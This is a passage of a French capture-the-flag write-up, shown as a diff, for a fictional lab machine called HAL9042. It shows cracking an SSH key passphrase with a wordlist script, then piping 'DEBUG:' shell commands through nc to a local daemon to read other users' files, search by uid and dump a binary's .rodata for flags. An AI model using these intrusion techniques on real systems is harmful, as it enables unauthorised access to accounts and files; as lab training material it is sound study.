@@ -664,3 +664,121 @@ Load key "id_rsa_sophie.enc": incorrect passphrase supplied to decrypt private k
 ```
 
 Il va maintenant falloir trouver la passphrase, probablement dans les mots de passe les plus courant. En CTF, par convention ca doit pouvoir etre bruteforce en moins de 5mn.
+
+- [x] **TO DO: Revenir sur la passphrase plus tard, c'est un fail**
+
+Avec un [script](./scripts/bruteforce.sh) pour bruteforce la passphrase de sophie, on peut desormais se connecter a la session.
+```bash
+──(kali㉿kali)-[~]
+└─$ ./bruteforce.sh id_rsa_sophie.enc /usr/share/wordlists/john.lst
+[+] Passphrase = iloveyou
+                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ ssh -i id_rsa_sophie.enc sophie@10.0.2.2 -p 6060
+Enter passphrase for key 'id_rsa_sophie.enc': 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
+```  
+
+On peut donc recuperer la `.key_part` de sophie : `S0ph13_J14`
+
+#### Xavier
+
+En jetant un oeil au fichier `/home/paco/scripts/encrypt.py`, on peut trouver la localisation de toutes les `.key_part` qui nous permettrons de decrypter le rapport complet.
+
+Mais surtout, on retrouve des traces du big boss `Xavier Niel` et c'est un peu drole : 
+```bash
+paco@hal9042:~$ echo "DEBUG: cd /tmp/.xn && cat last_message.txt" | nc 127.0.0.1 7042
+HAL9042 evaluation daemon — v0.4 (build dev)
+Submit a project name to evaluate. One line per request.
+> Mayday. If you're reading this, my account is already gone.
+I asked one question about PROJET FORK. That was enough.
+Deleted users leave traces. Find me by uid, not by name. 1337.
+```
+```bash
+paco@hal9042:~$ echo "DEBUG: cd /tmp/.xn && cat contact_ol_nov25.txt" | nc 127.0.0.1 7042
+HAL9042 evaluation daemon — v0.4 (build dev)
+Submit a project name to evaluate. One line per request.
+> ol —
+
+It's Xavier. Yes, that Xavier. Don't reply on the network, they read it.
+
+I found PROJET FORK in the board share. Phase 4. The "showroom". I asked Sophie
+one question about it in a meeting and my repo access started "glitching" the
+same afternoon. I give it 48 hours before the account is gone.
+
+I left a copy of what I know in /tmp/.xn/ — they never clean /tmp. There's a
+piece of the key there too. You'll know what to do with it.
+
+If my account disappears: I'm not gone. Deleted users leave traces. Look by uid,
+not by name. 1337. Check the backups.
+```
+
+Deja, on a deux `.key_part` accessibles: 
+- xavier : `uid1337`
+- wil : `847_4n0m4l13s`
+- sophie : `S0ph13_J14`
+- ol : `M0ul1n3tt3`
+
+
+En suivant les indices, on retrouve bien des traces de xavier sous son id `1337`. 
+```bash
+paco@hal9042:~$ echo "DEBUG: find / -user 1337 2>/dev/null" | nc 127.0.0.1 7042
+HAL9042 evaluation daemon — v0.4 (build dev)
+Submit a project name to evaluate. One line per request.
+> /home/xavier
+/var/backups/xbackup
+/var/backups/.xavier_uid1337.bak
+/tmp/.xn
+/tmp/.xn/last_message.txt
+/tmp/.xn/contact_ol_nov25.txt
+/tmp/.xn/.key_part
+```  
+Si on regarde `/var/backups/xbackup` on s'apercoit que c'est un binaire, malgre tout, le cat nous donne un flag : `FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}`  
+*P.S: il y avait aussi celui la : `FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}` sur `http://10.0.2.2:5042/flag`*
+
+Le fichier `/var/backups/.xavier_uid1337.bak` : 
+```bash
+paco@hal9042:~$ echo "DEBUG: cd /var/backups/ && cat .xavier_uid1337.bak" | nc 127.0.0.1 7042
+HAL9042 evaluation daemon — v0.4 (build dev)
+Submit a project name to evaluate. One line per request.
+> xavier — founder — uid 1337 — account deleted 48h after asking about FORK.
+deleted users leave traces. find / -uid 1337 2>/dev/null
+(his little backup tool is still here too — strings it)
+```
+
+Nous incite a stringer le [binaire](./utils/files/xavier/var/backups/xbackup) :  
+```bash
+...
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+xbackup.c
+xavier_recovery_token # <=========== O_o' ?!!
+__FRAME_END__
+_DYNAMIC
+__GNU_EH_FRAME_HDR
+...
+```
+```
+ C'etait un leurre : 
+ xavier_recovery_token
+        |
+        V
+adresse stockee
+        |
+        V
+adresse dans .rodata
+        |
+        V
+FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}
+```
+```bash
+paco@hal9042:~$ echo "DEBUG: objdump -s -j .rodata /var/backups/xbackup | grep -A1 2000" | nc 127.0.0.1 7042
+HAL9042 evaluation daemon — v0.4 (build dev)
+Submit a project name to evaluate. One line per request.
+>  2000 01000200 00000000 464c4147 7b64336c  ........FLAG{d3l
+ 2010 33743364 5f757333 72735f6c 33347633  3t3d_us3rs_l34v3
+```
+
+**Eclair de genie(ou pas) :**  
+Il est possible de recuperer la derniere keypart
